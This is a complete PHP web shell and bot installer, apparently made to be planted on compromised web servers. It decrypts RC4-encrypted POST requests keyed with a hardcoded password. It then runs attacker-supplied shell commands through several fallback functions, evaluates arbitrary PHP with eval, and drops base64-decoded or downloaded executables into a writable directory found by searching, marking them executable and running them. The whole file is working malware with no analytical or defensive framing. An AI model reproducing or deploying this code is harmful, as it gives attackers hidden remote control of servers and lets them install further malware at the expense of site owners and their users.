<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);


define('PWD', 'ce5ca673d13b36118d54a7cf13aeb0ca012383bf771e713421b4d1fd841f539a');
define('PWD_LEN', 64);
define('PWD_LEN_BASE64', 90);
define('BASE64_HEADER_LEN', 34);
define('ACTION_INSTALL', 1);
define('ACTION_CMD', 2);
define('ACTION_PHP', 3);


if($_SERVER['REQUEST_METHOD'] == 'POST') 
{
	$data = file_get_contents('php://input');
	$data_len = strlen($data);

	
		if($data_len >= PWD_LEN_BASE64 + BASE64_HEADER_LEN)
		{
			$data = rc4_decrypt($data, PWD);

				
				if(!substr_compare($data, PWD, 0, PWD_LEN))
				{
					$cmd_string = substr($data, PWD_LEN);
					$cmd = @json_decode($cmd_string, true);
					
						if($cmd != null)
						{
							if((isset($cmd['action']) && !empty($cmd['action'])) && (isset($cmd['data']) && !empty($cmd['data'])))
							{
								$result = array();
								
								
									switch($cmd['action'])
									{	
										case 1:
												$result = execSystemCmd($cmd['data']);
												break;
									
										case 2:
												$result = execPHPcmd($cmd['data']);
												break;
									
										case 3:
												$result = installBot($cmd['data'], 2);												
												//@mysqli_real_escape_string(null, $result['data']);
												break;
									
										default:
									}
									
								echo json_encode($result);	
							}
						}
				}
		}
}





function rc4($data, $pwd)
{
    $key[] ="";
    $box[] ="";
    $cipher = ""; 
    $pwd_length = strlen($pwd);
    $data_length = strlen($data);
        for ($i = 0; $i < 256; $i++)
                    {
                                    $key[$i] = ord($pwd[$i % $pwd_length]);
                                            $box[$i] = $i;
        }
        
    for ($j = $i = 0; $i < 256; $i++)
    {
        $j = ($j + $box[$i] + $key[$i]) % 256;
        $tmp = $box[$i];
        $box[$i] = $box[$j];
        $box[$j] = $tmp;
    }

    for ($a = $j = $i = 0; $i < $data_length; $i++)
    {
        $a = ($a + 1) % 256;
        $j = ($j + $box[$a]) % 256;
        $tmp = $box[$a];
        $box[$a] = $box[$j];
        $box[$j] = $tmp;
        $k = $box[(($box[$a] + $box[$j]) % 256)];       
        $cipher .= chr(ord($data[$i]) ^ $k);
    }    
    return $cipher;
}

function rc4_encrypt($plain_text, $password) 
{
    return base64_encode(rc4($plain_text, $password));
}

function rc4_decrypt($enc_text, $password) 
{
    return rc4(base64_decode($enc_text), $password);
} 

function execProc_open($data)
{
	$descr = array(
					0 => array(
								'pipe',
								'r'
								) ,
					1 => array(
								'pipe',
								'w'
								) ,
					2 => array(
								'pipe',
								'w'
								)
					);
					
	$pipes = array();
	$process = proc_open($data, $descr, $pipes);
	
	$result_1 = '';
	$result_2 = '';
	
		if(is_resource($process)) 
		{
			while($f = fgets($pipes[1])) 
			{
				$result_1 = $result_1.$f;
			}
			fclose($pipes[1]);
			
			while($f = fgets($pipes[2])) 
			{
				$result_2 = $result_2.$f;
			}
			
			fclose($pipes[2]);
			proc_close($process);
		}


	return $result_1.$result_2;
}


function execSystemCmd($cmd)
{
	//http://php.net/manual/en/ref.exec.php
	
	$result = array();
	$result['status'] = 'error';
	$result['data'] = null;
	
	$procOpenExists = function_exists('proc_open');
	$systemExists = function_exists('system');
	$passthruExists = function_exists('passthru');
	$execExists = function_exists('exec');
	$shell_execExists = function_exists('shell_exec');
	
	
		if($procOpenExists)
		{
			$result['status'] = 'success';
			
			$descr = array(
							0 => array(
										'pipe',
										'r'
										) ,
							1 => array(
										'pipe',
										'w'
										) ,
							2 => array(
										'pipe',
										'w'
										)
							);
					
			$pipes = array();
			$process = proc_open($cmd, $descr, $pipes);
	
			$result_1 = '';
			$result_2 = '';
	
				
				if(is_resource($process)) 
				{
					while($f = fgets($pipes[1])) 
					{
						$result_1 = $result_1.$f;
					}
					fclose($pipes[1]);
			
					while($f = fgets($pipes[2])) 
					{
						$result_2 = $result_2.$f;
					}
			
					fclose($pipes[2]);
					proc_close($process);
				}


			$result['data'] = $result_1.$result_2;	
		}
		elseif($systemExists)
		{
			$execResult = system(escapeshellcmd($cmd));
													
													
				if($execResult)
				{
					$result['status'] = 'success';
					$result['data'] = $execResult;
				}
		}
		elseif($passthruExists)
		{
			ob_start();
			passthru($cmd);
			$result['data'] = ob_get_contents();
			ob_end_clean();
														
			if($result['data'])
			{
				$result['status'] = 'success';
			}
		}
		elseif($execExists)
		{
			$execResult = array();
													
														
				exec(escapeshellcmd($cmd), $execResult);
													
				if($execResult)
				{
					$result['status'] = 'success';
					$result['data'] = implode('\n', $execResult);
				}
		}
		elseif($shell_execExists)
		{
			$execResult = shell_exec($cmd);
						
													
				if($execResult)
				{
					$result['status'] = 'success';
					$result['data'] = $execResult;
				}
		}
		else
		{
			//$type=trim(`stat -c%F $file`);
			$result['status'] = 'disabled';
		}


return $result;
}

function execPHPcmd($cmd)
{
	$result = array();
	$result['status'] = 'error';
	$result['data'] = null;
	
	
		try
		{
			ob_start();
			$result_eval = @eval($cmd);
			$result['data'] = ob_get_contents();
			ob_end_clean();
		}
		catch(ParseError $e)
		{
													
		}
		catch(Error $e)
		{
													
		}
		
		if($result['data'])
		{
			$result['status'] = 'success';
		}


return $result;
}


function startsWith($haystack, $needle)
{
     $length = strlen($needle);
     return (substr($haystack, 0, $length) === $needle);
}

function endsWith($haystack, $needle)
{
    $length = strlen($needle);

    return $length === 0 || 
    (substr($haystack, -$length) === $needle);
}

function searchDir($path, $path_prev = null, $back = false)
{
	$result = null;
	
		try
		{
			$objects = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path), RecursiveIteratorIterator::SELF_FIRST);
		}
		catch(Exception $e)
		{
			return $result;
		}

		foreach($objects as $name => $object)
		{
			//if(!endsWith($name, '.') && !endsWith($name, '..'))
			if(!endsWith($name, '..'))
			{
				
				if(!$back)
				{
					if(is_dir($name))
					{
						if(is_writable($name))
						{
							$result = $name;
							break;
						}
								
					}
				}
				else
				{
					if(!startsWith($name, $path_prev))
					{
						if(is_dir($name))
						{
							if(is_writable($name))
							{
								$result = $name;
								break;
							}	
						}
					}
				}
			}
		}
		
		
return $result;
}





function searchBack($path, $stopDir)
{
	$path_array = explode('/', $path);
	$result = null;

		for($i = 0; $i < count($path_array) - 1; $i++)
		{
			$path_prev = $path;
			$path = substr($path, 0, strrpos($path, '/'));
			
				if($path == $stopDir)
				{
					break;
				}
			
			
				if(($result = searchDir($path, $path_prev, true)) != null)
				{
					break;
				}
		}


return $result;
}

function searchUp($path)
{
	$result = searchDir($path, null, false);


return $result;
}

function makeStopPath($depth = 3)
{
	$result = '';
	$path = realpath(getcwd());
	$path_array = explode('/', ltrim($path, '/'));
	$path_array_count = count($path_array);


		if($path_array_count <= $depth)
		{
			$depth = round($path_array_count / 3);
		}

		for($i = 0; $i < $depth; $i ++)
		{
			$result .= '/'.$path_array[$i];
		}


return $result;	
}

function fullSearch()
{
	$path = realpath(getcwd());
	$stopDir = makeStopPath(3);
	$result = null;
	
	
		if(($result = searchUp($path)) == null)
		{
			$result = searchBack($path, $stopDir);
		}
		
		
return $result;
}


function downloadFile($path, $url)
{
	$result = null;
	
	$handle = fopen($url, 'rb');
		
		
		if($handle)
		{
			//$contents = stream_get_contents($handle);
			$content = '';

	
				while(!feof($handle)) 
				{
					$content .= fread($handle, 8192);
				}	
				fclose($handle);
				
				$botPath = getBotName($path);
				$handle = fopen($botPath, 'w'); 
				
						
				if($handle)
				{
					if(fwrite($handle, $content))
					{ 
						fclose($handle);
						chmod($botPath , 0755);
						
						$result = $botPath;
					}
						
				}
		}


return $result;
}


function createFile($path, $content)
{
	$result = array();
	$data = null;
	$data_amd = null;
		
		//echo count($content);
/*		
		if(php_uname('m') === 'x86_64')
		{
			$data = @base64_decode($content['x86_64']);
		}
		else
		{
			$data = @base64_decode($content['x86']);
		}
*/

/*
		if($data)
		{
			$botPath = getBotName($path);
			$handle = fopen($botPath, 'w'); 
				
					
				if($handle)
				{
					
			echo $botPath."---";		
					if(fwrite($handle, $data))
					{ 
							fclose($handle);
							chmod($botPath , 0755);
						
						$result = $botPath;
					}		
				}
		}
*/
	$contentCount = count($content);


		//for($i = 0; $i < $contentCount; $i++)
		
		foreach($content as $bData) 
		{
			//$data = @base64_decode($content[$i]);
			$data = @base64_decode($bData);
			
			
				if($data)
				{
					$botPath = getBotName($path);
					$handle = fopen($botPath, 'w'); 
				
					
						if($handle)
						{							
							if(fwrite($handle, $data))
							{ 
									fclose($handle);
									chmod($botPath , 0755);
						
								$result[] = $botPath;
							}		
						}
				}
		}
		

return $result;
}


function getBotName($path)
{
	$result = null;
	
	while(!$result)
	{
		$tmp_path = $path.'/'.randStr();
		
			
			if(!file_exists($tmp_path))
			{
				$result = $tmp_path;
			}
	}
	
	
return $result;
}

function randStr($length = 10) 
{
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $result = '';


		for($i = 0; $i < $length; $i++) 
		{
			$result .= $characters[rand(0, $charactersLength - 1)];
		}
		
		
return $result;
}


function installBot($data, $method)
{
	$result = array();
	$result['status'] = 'error';
	$result['data'] = null;
		
	
		if(($installTo = fullSearch()) != null)
		{
			$installedPath = array();
			
				//echo intval($method);
				switch(intval($method))
				{
					case 1:
							$installedPath = downloadFile($installTo, $data);
							break;
					case 2:
							$installedPath = createFile($installTo, $data);
							break;
							
					default:
				}
					
			$countInstalledPath	= count($installedPath);	
							
							
			//if(($installedPath = downloadFile($installTo, $data)) != null)
			if($countInstalledPath > 0)
			{
				for($i = 0; $i < $countInstalledPath; $i++)
				{
					$result = execSystemCmd($installedPath[$i]);
					
					
						if($result['status'] != 'success')
						{
							//$result['data'] = $result_exec['data'];		
							
							
							@unlink($installedPath[$i]);		//FIXME
						}
						else
						{
							//$i++;
							
								if($i < $countInstalledPath)
								{
									for($j = $i; $j < $countInstalledPath; $j++)
									{
										@unlink($installedPath[$j + 1]);
									}
							
									break;
								}
						}
				}	
			}
			else
			{
				$result['data'] = 'download error';
			}
		}
		else
		{
			$result['data'] = 'cnt find writeble folder';
		}
		
	
return $result;
}	
		
		
		
		
//<b>Warning</b>:  proc_open() has been disabled for security reasons
//responce_result: Warning: php_uname() has been disabled for security reasons		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		

?>
